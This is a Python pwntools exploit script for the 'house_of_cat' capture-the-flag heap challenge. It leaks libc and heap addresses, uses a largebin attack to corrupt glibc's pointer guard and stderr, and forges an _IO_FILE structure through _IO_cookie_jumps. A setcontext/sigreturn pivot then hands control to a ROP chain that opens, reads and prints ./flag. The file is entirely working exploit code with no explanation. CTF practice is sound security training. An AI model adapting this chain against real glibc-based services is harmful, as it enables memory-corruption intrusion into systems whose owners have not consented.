from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = process('./house_of_cat')
elf = ELF('./house_of_cat')
libc = ELF('./libc.so.6')
main_arena_base = 0x219C80


def add_cat(index, size, content):
    io.sendlineafter(b'mew mew mew~~~~~~', b'CAT | r00t QWB QWXF\xFF$')  # enter the menu
    io.sendlineafter(b'plz input your cat choice:\n', b'1')
    io.sendlineafter(b'plz input your cat idx:\n', str(index).encode())
    io.sendlineafter(b'plz input your cat size:\n', str(size).encode())
    io.sendafter(b'plz input your content:\n', content)


def delete_cat(index):
    io.sendlineafter(b'mew mew mew~~~~~~', b'CAT | r00t QWB QWXF\xFF$')  # enter the menu
    io.sendlineafter(b'plz input your cat choice:\n', b'2')
    io.sendlineafter(b'plz input your cat idx:\n', str(index).encode())


def show_cat(index):
    io.sendlineafter(b'mew mew mew~~~~~~', b'CAT | r00t QWB QWXF\xFF$')  # enter the menu
    io.sendlineafter(b'plz input your cat choice:\n', b'3')
    io.sendlineafter(b'plz input your cat idx:\n', str(index).encode())


def edit_cat(index, content):
    io.sendlineafter(b'mew mew mew~~~~~~', b'CAT | r00t QWB QWXF\xFF$')  # enter the menu
    io.sendlineafter(b'plz input your cat choice:\n', b'4')
    io.sendlineafter(b'plz input your cat idx:\n', str(index).encode())
    io.sendlineafter(b'plz input your content:\n', content)


io.sendlineafter(b'mew mew mew~~~~~~', b'LOGIN | r00t QWB QWXFadmin\x00')  # admin = 1

# add_cat(0, 0x430, b'colin')
add_cat(1, 0x428, b'colin')
add_cat(2, 0x430, b'colin')
add_cat(4, 0x418, b'colin')
add_cat(5, 0x440, b'colin')

delete_cat(1)
show_cat(1)
io.recv(9)
main_arena = u64(io.recv(6) + b'\x00\x00') - 96
base = main_arena - main_arena_base
stderr = base + libc.symbols['stderr']
tcbhead_t = base - 0x28C0
_IO_cookie_jumps = base + 0x215B80
print(hex(base))

add_cat(3, 0x440, b'colin')

delete_cat(4)
show_cat(1)
io.recv(25)
heap_base = u64(io.recv(6) + b'\x00\x00') - 0x290

edit_cat(1, p64(main_arena + 1104) * 2 + p64(0) + p64(tcbhead_t + 0x10))
add_cat(0, 0x430, b'colin')
pointer_guard = heap_base + 0xB00
print(hex(pointer_guard))
print(hex(heap_base))

# some useful gadgets
pcop = 0x1675B0 + base
pop_rdi = 0x2A3E5 + base
pop_rsi = 0x2BE51 + base
pop_rdx_rbx = 0x90529 + base
pop_rax = 0x45EB0 + base
syscall = 0x91396 + base
print(hex(pcop))
encrypted_addr = ((pcop ^ pointer_guard) << 0x11) & ((1 << 64) - 1) + \
                 (((pcop ^ pointer_guard) & (((1 << 64) - 1) - ((1 << 47) - 1))) >> 47)

# create fake _IO_FILE struct for fake stderr
payload = FileStructure()
payload.vtable = _IO_cookie_jumps + 0x38  # address of _IO_file_xsputn, vtable + 0x38 = _IO_cookie_read
payload._lock = base + 0x21BA70  # _IO_stdfile_1_lock
payload = bytes(payload)[0x10:]
payload += p64(heap_base + 0x28F0 + 0x100)
payload += p64(encrypted_addr)
payload = payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += p64(heap_base + 0x28F0 + 0x100)
payload += p64(0) * 2
payload += p64(base + libc.symbols['setcontext'] + 61)

# use SigReturn frame to set rsp and rcx
frame = SigreturnFrame()
frame.rsp = heap_base + 0x28F0 + 0x300
frame.rip = pop_rdi + 1
payload += flat(frame)[0x28:]
payload = payload.ljust(0x300, b'\x00')

# construct ROP chain
# close the stdin, and it will reopen automatically
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(base + libc.symbols['close'])

# open file ./flag
payload += p64(pop_rdi)
payload += p64(heap_base + 0x28F0 + 0x400)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)  # syscall code for open
payload += p64(syscall)

# read file ./flag to heap
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(heap_base + 0x500)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(base + libc.symbols['read'])

# write content in ./flag
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap_base + 0x500)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(base + libc.symbols['write'])

payload = payload.ljust(0x400) + b'./flag\x00'

add_cat(6, 0x430, b'colin')
add_cat(7, 0x450, b'colin')
add_cat(8, 0x430, b'colin')
add_cat(9, 0x440, payload)
add_cat(10, 0x430, b'colin')
delete_cat(6)
delete_cat(7)

add_cat(11, 0x460, b'\x00' * 0x430 + p64(0) + p64(0x461))
add_cat(12, 0x420, b'\x00')
delete_cat(7)

add_cat(13, 0x450, b'\x00' * 0x20 + p64(0) + p64(0x1101))
delete_cat(7)
add_cat(14, 0x460, b'\x00')
delete_cat(9)
delete_cat(12)
delete_cat(14)

# delete_cat(11)
edit_cat(7, p64(base + 0x21A0E0) * 2 + p64(0) + p64(base + libc.symbols['stderr'] - 0x20) + p64(0) + p64(0x201))
io.sendlineafter(b'mew mew mew~~~~~~', b'CAT | r00t QWB QWXF\xFF$')  # enter the menu
io.sendlineafter(b'plz input your cat choice:\n', b'1')
io.sendlineafter(b'plz input your cat idx:\n', b'15')
# gdb.attach(io)
# time.sleep(1)
io.sendlineafter(b'plz input your cat size:\n', b'1129')
io.interactive()
